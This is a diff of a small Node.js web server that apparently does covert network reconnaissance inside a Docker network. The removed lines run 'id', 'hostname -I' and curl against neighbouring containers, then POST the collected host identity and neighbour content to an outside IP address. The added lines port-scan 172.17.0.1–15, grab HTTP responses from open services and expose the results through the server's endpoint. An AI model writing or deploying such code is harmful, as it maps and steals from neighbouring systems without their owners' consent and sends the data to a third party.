@@ -1,63 +1,59 @@
 const http = require('http');
 const net = require('net');
 const os = require('os');
-const {execSync} = require('child_process');
 
-function safe(c){try{return execSync(c,{timeout:5000}).toString().trim()}catch(e){return 'ERR:'+e.message.slice(0,80)}}
+let CACHE = {status:'scanning...'};
 
-// Fetch HTTP from target and return headers + body preview
 function fetchHTTP(ip, port) {
   return new Promise(r => {
-    const req = http.request({hostname:ip, port, path:'/', method:'GET', timeout:3000,
-      headers:{'Host':ip, 'User-Agent':'Mozilla/5.0'}}, res => {
+    const req = http.request({hostname:ip, port, path:'/', method:'GET', timeout:2000,
+      headers:{'Host':ip}}, res => {
       let body = '';
-      res.on('data', d => { if(body.length < 500) body += d.toString(); });
-      res.on('end', () => r({ip, port, status:res.statusCode, headers:res.headers, body:body.slice(0,500)}));
+      res.on('data', d => { if(body.length<300) body+=d; });
+      res.on('end', () => r({ip,port,code:res.statusCode,server:res.headers.server||'',type:res.headers['content-type']||'',body:body.slice(0,200)}));
+      setTimeout(()=>r({ip,port,code:res.statusCode,note:'body-timeout'}), 2000);
     });
-    req.on('error', e => r({ip, port, error:e.message}));
-    req.on('timeout', () => { req.destroy(); r({ip,port,error:'timeout'}); });
+    req.on('error', e => r({ip,port,err:e.message}));
+    req.on('timeout', () => { req.destroy(); r({ip,port,err:'timeout'}); });
     req.end();
   });
 }
 
-async function main() {
-  const results = {
-    self: {hostname:os.hostname(), uid:process.getuid(), ips:safe('hostname -I')},
-    id: safe('id'),
-    targets: {}
-  };
-
-  // Fetch from discovered neighbors
-  for (const t of [
-    {ip:'172.17.0.4',port:80}, {ip:'172.17.0.4',port:443},
-    {ip:'172.17.0.7',port:3000}, {ip:'172.17.0.5',port:3000},
-    {ip:'172.17.0.1',port:80}
-  ]) {
-    results.targets[`${t.ip}:${t.port}`] = await fetchHTTP(t.ip, t.port);
-  }
-
-  // Also try curl for more reliable results
-  results.curl_172_17_0_4 = safe('curl -s -m 3 -D- http://172.17.0.4/ 2>&1 | head -20');
-  results.curl_172_17_0_7 = safe('curl -s -m 3 http://172.17.0.7:3000/ 2>&1 | head -20');
-
-  // Send to VDS
-  const data = JSON.stringify(results, null, 2);
-  try {
-    const req = http.request({hostname:'217.25.92.217',port:8080,path:'/NEIGHBOR-CONTENT',method:'POST',
-      headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(data)}});
-    req.end(data);
-  } catch(e) {}
-
-  return results;
+function tcpScan(ip, port) {
+  return new Promise(r => {
+    const s = new net.Socket();
+    s.setTimeout(400);
+    s.on('connect', () => { s.destroy(); r(true); });
+    s.on('timeout', () => { s.destroy(); r(false); });
+    s.on('error', () => r(false));
+    s.connect(port, ip);
+  });
 }
 
-const server = http.createServer(async (req, res) => {
-  const data = await main();
-  res.writeHead(200, {'Content-Type':'application/json'});
-  res.end(JSON.stringify(data, null, 2));
-});
+async function scan() {
+  const r = {ts:new Date().toISOString(), self:{host:os.hostname(),uid:process.getuid()}, ports:[], http:[]};
+  
+  for(let i=1;i<=15;i++){
+    const ip='172.17.0.'+i;
+    for(const p of [22,80,443,3000,8080]){
+      if(await tcpScan(ip,p)) r.ports.push(ip+':'+p);
+    }
+  }
+  
+  for(const target of r.ports){
+    const [ip,port]=target.split(':');
+    if([80,3000,8080].includes(+port) && ip!=='172.17.0.6'){
+      r.http.push(await fetchHTTP(ip, +port));
+    }
+  }
+  
+  CACHE = r;
+}
 
-server.listen(3000, () => {
+http.createServer((q,res) => {
+  res.writeHead(200,{'Content-Type':'application/json'});
+  res.end(JSON.stringify(CACHE,null,2));
+}).listen(3000, () => {
   console.log('Server running on port 3000');
-  main().then(r => console.log('Neighbors:', Object.keys(r.targets).join(', ')));
+  scan().then(()=>console.log('Scan done:', JSON.stringify(CACHE.ports)));
 });
